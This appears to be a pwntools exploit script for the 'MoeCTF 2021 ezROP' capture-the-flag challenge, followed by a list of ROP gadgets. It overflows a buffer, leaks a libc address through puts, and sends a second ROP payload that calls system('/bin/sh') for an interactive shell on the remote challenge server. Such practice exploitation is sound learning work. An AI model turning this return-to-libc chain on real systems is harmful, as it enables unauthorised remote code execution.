from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])




# io=process("./[MoeCTF 2021]ezROP")
io=remote("43.142.108.3",28156)
elf=ELF("./[MoeCTF 2021]ezROP")

pop_rdi_ret=0x400c83
puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
encryption=0x4009a0


io.recvuntil(b"choice!\n")
io.sendline(b"1")

payload=b"a"*0x58+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(encryption)
io.recvuntil(b"encrypted\n")

# gdb.attach(io)
# pause()

io.sendline(payload)


leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x06f6a0
print("leak_addr:  "+hex(leak_addr))

sys_addr=leak_addr+0x0453a0
str_bin_sh=leak_addr+0x18ce57


io.recvuntil(b"encrypted\n")
payload=cyclic(0x58)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()



# Gadgets information
# ============================================================
# 0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c80 : pop r14 ; pop r15 ; ret
# 0x0000000000400c82 : pop r15 ; ret
# 0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004007f0 : pop rbp ; ret
# 0x0000000000400aec : pop rbx ; pop rbp ; ret
# 0x0000000000400c83 : pop rdi ; ret
# 0x0000000000400c81 : pop rsi ; pop r15 ; ret
# 0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006b9 : ret
# 0x00000000004008ca : ret 0x2017
# 0x0000000000400962 : ret 0x458b
# 0x00000000004009c5 : ret 0xbf02

# Unique gadgets found: 15